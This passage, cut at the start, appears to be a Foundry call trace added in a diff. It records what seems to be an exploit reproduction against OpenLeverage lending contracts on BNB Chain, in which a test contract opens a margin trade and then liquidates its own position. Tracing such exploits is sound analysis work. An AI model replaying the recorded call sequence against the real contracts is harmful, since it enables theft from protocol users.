+    │   │   │   ├─ [717] WBNB::allowance(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], 0x1111111254EEB25477B68fb85Ed929f73A960582) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [2420] WBNB::approve(0x1111111254EEB25477B68fb85Ed929f73A960582, 0)
+    │   │   │   │   ├─ emit Approval(owner: TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], spender: 0x1111111254EEB25477B68fb85Ed929f73A960582, value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [717] WBNB::allowance(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4], 0x1111111254EEB25477B68fb85Ed929f73A960582) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [531] BUSDT::balanceOf(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4]) [staticcall]
+    │   │   │   │   └─ ← [Return] 81492486034128386199270 [8.149e22]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000422c5d973b6d83621f9
+    │   │   ├─ [531] BUSDT::balanceOf(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4]) [staticcall]
+    │   │   │   └─ ← [Return] 81492486034128386199270 [8.149e22]
+    │   │   ├─ [24109] 0x665C2e9C433f07cB464Fa1315942c2e05be19208::c19ef550(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000004c34c0adff3faaa82a600000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000280000000000000000000000000a75323e651e0eac7756003f7e0c3fc8967fb19250000000000000000000000007c5e04894410e98b1788fbdb181ffacbf8e6061700000000000000000000000055d398326f99059ff775485246999027b3197955000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000000000000000000000000c7e6b62fa641d528c3f000000000000000000000000000000000000000000000008c01fe994fd163e2f00000000000000000000000000000000000000000000023cb83085df010ec49a0000000000000000000000000000000000000000000000031ea839a105b3501100000000000000000000000000000000000000000000000000000000000001c20000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000f000000000000000000000000000000000000000000000000000000000000001500000000000000000000000000000000000000000000000000000000000000010300000000000000000000000000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   ├─ [1676] TradeController::addressConfig() [staticcall]
+    │   │   │   │   ├─ [904] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::addressConfig() [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000e9e321d1cb6b540e922a5e4d8720feed0749e93f000000000000000000000000912c0462474c933499a6923a6afc6ac1e58b8ce4000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000071f1158d76af5b6762d5ebcdee19105eab2c77d2
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000e9e321d1cb6b540e922a5e4d8720feed0749e93f000000000000000000000000912c0462474c933499a6923a6afc6ac1e58b8ce4000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000071f1158d76af5b6762d5ebcdee19105eab2c77d2
+    │   │   │   ├─ [1687] TradeController::calculateConfig() [staticcall]
+    │   │   │   │   ├─ [863] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::calculateConfig() [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000009c4000000000000000000000000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000190000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000084595161401484a00000000000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000003c
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000009c4000000000000000000000000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000190000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000084595161401484a00000000000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000003c
+    │   │   │   ├─ [1293] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617::borrowBalanceStored(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   ├─ [554] 0xe307E9C4aa77E69FF084E4FFCd7de93F497D68b6::borrowBalanceStored(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 33127665676864412120 [3.312e19]
+    │   │   │   │   └─ ← [Return] 33127665676864412120 [3.312e19]
+    │   │   │   ├─ [6123] 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F::getPriceCAvgPriceHAvgPrice(BUSDT: [0x55d398326f99059fF775485246999027B3197955], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 60, 0x03) [staticcall]
+    │   │   │   │   ├─ [5321] 0x0EFF0F83Aeb1A3573AE15E864Ac75f45b970e159::getPriceCAvgPriceHAvgPrice(BUSDT: [0x55d398326f99059fF775485246999027B3197955], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 60, 0x03) [delegatecall]
+    │   │   │   │   │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4977919477493274700049610 [4.977e24], 8455396267943590365836 [8.455e21], 1711948730 [1.711e9]
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000005c1489afbf8ebd0bee00000000000000000000000000000000000000000000005aed5d4a3d8cf7bac700000000000000000000000000000000000000000000005aed5d4a3d8cf7bac7000000000000000000000000000000000000000000000000000000000000001800000000000000000000000000000000000000000000000000000000660a43ba
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000005c1489afbf8ebd0bee00000000000000000000000000000000000000000000005aed5d4a3d8cf7bac700000000000000000000000000000000000000000000005aed5d4a3d8cf7bac7000000000000000000000000000000000000000000000000000000000000001800000000000000000000000000000000000000000000000000000000660a43ba
+    │   │   │   ├─ [1687] TradeController::calculateConfig() [staticcall]
+    │   │   │   │   ├─ [863] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::calculateConfig() [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000009c4000000000000000000000000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000190000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000084595161401484a00000000000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000003c
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000009c4000000000000000000000000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000190000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000084595161401484a00000000000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000003c
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─ emit MarginTrade(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 24, : true, : true, : 2961148680678296281262 [2.961e21], : 33127665676864412120 [3.312e19], : 22492681047805229147877 [2.249e22], : 0, : 589564986975499600656 [5.895e20], : 21)
+    │   │   └─ ← [Return] 22492060463987568575143 [2.249e22]
+    │   └─ ← [Return] 22492060463987568575143 [2.249e22]
+    ├─ [263510] OPBorrowingDelegator::liquidate(24, true, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [262835] 0xd3150b1242315e16845Fe21b536F53A82B6B85a5::liquidate(24, true, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   ├─ [1523] 0x912C0462474c933499a6923a6Afc6AC1E58b8Ce4::collLiquidateAllowed(24) [staticcall]
+    │   │   │   ├─ [784] 0xbdc76cD9B04f17473aafE4569F4776Cec76F0526::collLiquidateAllowed(24) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─ [531] BUSDT::balanceOf(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47]) [staticcall]
+    │   │   │   └─ ← [Return] 56744600141967876389900 [5.674e22]
+    │   │   ├─ [534] WBNB::balanceOf(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47]) [staticcall]
+    │   │   │   └─ ← [Return] 28168569652326010855 [2.816e19]
+    │   │   ├─ [2485] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617::borrowBalanceCurrent(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [1745] 0xe307E9C4aa77E69FF084E4FFCd7de93F497D68b6::borrowBalanceCurrent(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 33127665676864412120 [3.312e19]
+    │   │   │   └─ ← [Return] 33127665676864412120 [3.312e19]
+    │   │   ├─ [6354] 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F::updatePriceOracle(BUSDT: [0x55d398326f99059fF775485246999027B3197955], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 60, 0x03)
+    │   │   │   ├─ [5609] 0x0EFF0F83Aeb1A3573AE15E864Ac75f45b970e159::updatePriceOracle(BUSDT: [0x55d398326f99059fF775485246999027B3197955], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 60, 0x03) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [6123] 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F::getPriceCAvgPriceHAvgPrice(BUSDT: [0x55d398326f99059fF775485246999027B3197955], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 60, 0x03) [staticcall]
+    │   │   │   ├─ [5321] 0x0EFF0F83Aeb1A3573AE15E864Ac75f45b970e159::getPriceCAvgPriceHAvgPrice(BUSDT: [0x55d398326f99059fF775485246999027B3197955], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 60, 0x03) [delegatecall]
+    │   │   │   │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4977919477493274700049610 [4.977e24], 8455396267943590365836 [8.455e21], 1711948730 [1.711e9]
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000005c1489afbf8ebd0bee00000000000000000000000000000000000000000000005aed5d4a3d8cf7bac700000000000000000000000000000000000000000000005aed5d4a3d8cf7bac7000000000000000000000000000000000000000000000000000000000000001800000000000000000000000000000000000000000000000000000000660a43ba
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000005c1489afbf8ebd0bee00000000000000000000000000000000000000000000005aed5d4a3d8cf7bac700000000000000000000000000000000000000000000005aed5d4a3d8cf7bac7000000000000000000000000000000000000000000000000000000000000001800000000000000000000000000000000000000000000000000000000660a43ba
+    │   │   ├─ [1445] xOLE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [706] 0x10551D76f20f0Ee53f3812B4092D5E00550aadA7::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 1
+    │   │   │   └─ ← [Return] 1
+    │   │   ├─ [3880] 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F::getToken0Liquidity(BUSDT: [0x55d398326f99059fF775485246999027B3197955], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x03) [staticcall]
+    │   │   │   ├─ [3120] 0x0EFF0F83Aeb1A3573AE15E864Ac75f45b970e159::getToken0Liquidity(BUSDT: [0x55d398326f99059fF775485246999027B3197955], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x03) [delegatecall]
+    │   │   │   │   ├─ [531] BUSDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4977919477493274700049610 [4.977e24]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000041e1d8e3ba86589be6cca
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000041e1d8e3ba86589be6cca
+    │   │   ├─ [5842] 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F::getPrice(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0x03) [staticcall]
+    │   │   │   ├─ [5097] 0x0EFF0F83Aeb1A3573AE15E864Ac75f45b970e159::getPrice(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0x03) [delegatecall]
+    │   │   │   │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4977919477493274700049610 [4.977e24], 8455396267943590365836 [8.455e21], 1711948730 [1.711e9]
+    │   │   │   │   ├─ [465] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] BUSDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001e6fbc6c413a95d24792b450000000000000000000000000000000000000000000000000000000000000018
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001e6fbc6c413a95d24792b450000000000000000000000000000000000000000000000000000000000000018
+    │   │   ├─ [3622] TradeController::taxes(24, WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0) [staticcall]
+    │   │   │   ├─ [2874] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::taxes(24, WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [3622] TradeController::taxes(24, WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 2) [staticcall]
+    │   │   │   ├─ [2874] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::taxes(24, WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 2) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [3622] TradeController::taxes(24, BUSDT: [0x55d398326f99059fF775485246999027B3197955], 1) [staticcall]
+    │   │   │   ├─ [2874] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::taxes(24, BUSDT: [0x55d398326f99059fF775485246999027B3197955], 1) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [2638] BUSDT::allowance(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F) [staticcall]
+    │   │   │   └─ ← [Return] 56098924417610693 [5.609e16]
+    │   │   ├─ [5362] BUSDT::approve(0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F, 0)
+    │   │   │   ├─ emit Approval(owner: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], spender: 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2562] BUSDT::approve(0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F, 1000000 [1e6])
+    │   │   │   ├─ emit Approval(owner: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], spender: 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F, value: 1000000 [1e6])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [17172] 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F::buy(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0, 0, 33790218990401700362 [3.379e19], 1000000 [1e6], 0x03)
+    │   │   │   ├─ [16369] 0x0EFF0F83Aeb1A3573AE15E864Ac75f45b970e159::buy(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0, 0, 33790218990401700362 [3.379e19], 1000000 [1e6], 0x03) [delegatecall]
+    │   │   │   │   ├─ [8977] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::sync()
+    │   │   │   │   │   ├─ [531] BUSDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4977919477493274700049610 [4.977e24]
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 8455396267943590365836 [8.455e21]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 4977919477493274700049610 [4.977e24], reserve1: 8455396267943590365836 [8.455e21])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4977919477493274700049610 [4.977e24], 8455396267943590365836 [8.455e21], 1711948730 [1.711e9]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 28168569652326010855 [2.816e19]
+    │   │   │   │   └─ ← [Revert] revert: sell amount not enough
+    │   │   │   └─ ← [Revert] revert: sell amount not enough
+    │   │   ├─ [49133] 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F::sell(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 1000000 [1e6], 0, 0x03)
+    │   │   │   ├─ [48382] 0x0EFF0F83Aeb1A3573AE15E864Ac75f45b970e159::sell(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 1000000 [1e6], 0, 0x03) [delegatecall]
+    │   │   │   │   ├─ [8977] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::sync()
+    │   │   │   │   │   ├─ [531] BUSDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4977919477493274700049610 [4.977e24]
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 8455396267943590365836 [8.455e21]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 4977919477493274700049610 [4.977e24], reserve1: 8455396267943590365836 [8.455e21])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [531] BUSDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4977919477493274700049610 [4.977e24]
+    │   │   │   │   ├─ [6034] BUSDT::transferFrom(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 1000000 [1e6])
+    │   │   │   │   │   ├─ emit Transfer(from: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, value: 1000000 [1e6])
+    │   │   │   │   │   ├─ emit Approval(owner: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], spender: 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F, value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [531] BUSDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4977919477493274701049610 [4.977e24]
+    │   │   │   │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4977919477493274700049610 [4.977e24], 8455396267943590365836 [8.455e21], 1711948730 [1.711e9]
+    │   │   │   │   ├─ [531] BUSDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4977919477493274701049610 [4.977e24]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 28168569652326010855 [2.816e19]
+    │   │   │   │   ├─ [21155] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::swap(0, 1694, OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], 0x)
+    │   │   │   │   │   ├─ [6062] WBNB::transfer(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], 1694)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, to: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], value: 1694)
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [531] BUSDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4977919477493274701049610 [4.977e24]
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 8455396267943590364142 [8.455e21]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 4977919477493274701049610 [4.977e24], reserve1: 8455396267943590364142 [8.455e21])
+    │   │   │   │   │   ├─ emit Swap(sender: 0xE9E321D1cb6b540E922a5e4d8720FEed0749e93F, amount0In: 1000000 [1e6], amount1In: 0, amount0Out: 0, amount1Out: 1694, to: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [534] WBNB::balanceOf(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 28168569652326012549 [2.816e19]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000069e
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000069e
+    │   │   ├─ [21150] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617::repayBorrowEndByOpenLev(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14812739983287788 [1.481e16])
+    │   │   │   ├─ [20480] 0xe307E9C4aa77E69FF084E4FFCd7de93F497D68b6::repayBorrowEndByOpenLev(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14812739983287788 [1.481e16]) [delegatecall]
+    │   │   │   │   ├─ [1580] 0x912C0462474c933499a6923a6Afc6AC1E58b8Ce4::repayBorrowAllowed(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14812739983287788 [1.481e16], true)
+    │   │   │   │   │   ├─ [920] 0xbdc76cD9B04f17473aafE4569F4776Cec76F0526::repayBorrowAllowed(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14812739983287788 [1.481e16], true) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0x7c5e04894410e98b1788fbdB181FfACbf8e60617) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 120876726198514461291 [1.208e20]
+    │   │   │   │   ├─ [5425] WBNB::transferFrom(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], 0x7c5e04894410e98b1788fbdB181FfACbf8e60617, 14812739983287788 [1.481e16])
+    │   │   │   │   │   ├─ emit Transfer(from: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], to: 0x7c5e04894410e98b1788fbdB181FfACbf8e60617, value: 14812739983287788 [1.481e16])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0x7c5e04894410e98b1788fbdB181FfACbf8e60617) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 120891538938497749079 [1.208e20]
+    │   │   │   │   ├─ emit RepayBorrow(: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 14812739983287788 [1.481e16], : 33112852936881124332 [3.311e19], : 0, : 41520146736955272543 [4.152e19])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Return] 
+    │   │   ├─ [25162] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3)
+    │   │   │   ├─ emit Transfer(from: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2717] WBNB::allowance(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], 0x6BC99aa7412f7Af5770AEE7Dcf81723730DB33f2) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [22320] WBNB::approve(0x6BC99aa7412f7Af5770AEE7Dcf81723730DB33f2, 24)
+    │   │   │   ├─ emit Approval(owner: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], spender: 0x6BC99aa7412f7Af5770AEE7Dcf81723730DB33f2, value: 24)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [19084] 0x6BC99aa7412f7Af5770AEE7Dcf81723730DB33f2::transferIn(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 24)
+    │   │   │   ├─ [13894] 0x9781E326ca458c86c0d78b67cA5cF80344C5f3aF::transferIn(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 24) [delegatecall]
+    │   │   │   │   ├─ [2534] WBNB::balanceOf(0x6BC99aa7412f7Af5770AEE7Dcf81723730DB33f2) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 896269716996843538 [8.962e17]
+    │   │   │   │   ├─ [6948] WBNB::transferFrom(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], 0x6BC99aa7412f7Af5770AEE7Dcf81723730DB33f2, 24)
+    │   │   │   │   │   ├─ emit Transfer(from: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], to: 0x6BC99aa7412f7Af5770AEE7Dcf81723730DB33f2, value: 24)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0x6BC99aa7412f7Af5770AEE7Dcf81723730DB33f2) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 896269716996843562 [8.962e17]
+    │   │   │   │   ├─ emit Received(: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], : 24, : 24)
+    │   │   │   │   └─ ← [Stop] 
